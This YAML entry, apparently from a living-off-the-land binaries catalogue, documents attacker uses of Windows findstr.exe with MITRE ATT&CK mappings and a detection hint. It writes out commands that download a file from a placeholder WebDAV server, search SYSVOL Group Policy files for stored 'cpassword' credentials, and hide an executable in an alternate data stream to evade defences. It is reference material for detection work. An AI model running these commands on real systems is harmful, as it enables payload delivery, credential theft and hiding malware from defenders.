---
name: Findstr.exe
description: 
functions:
  download:
    - description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is downloaded to the target file.
      code: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe
      mitreid: T1185
      mitrelink: https://attack.mitre.org/wiki/Technique/T1185
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Download/Copy file from webdav server
  credentials:
    - description: Search for stored password in Group Policy files stored on SYSVOL.
      code: findstr /S /I cpassword \\sysvol\policies\*.xml
      mitreid: T1081
      mitrelink: https://attack.mitre.org/wiki/Technique/T1081
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Find credentials stored in cpassword attrbute
  ads:
    - description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
      code: findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Add a file to an alternate data stream to hide from defensive counter measures
    - description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
      code: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Add a file to an alternate data stream from a webdav server to hide from defensive counter measures
resources:
    - resource: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
    - resource: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
fullpath:
    - path: C:\Windows\System32\findstr.exe
    - path: C:\Windows\SysWOW64\findstr.exe
detection:
  - IOC: finstr.exe should normally not be invoked on a client system
acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
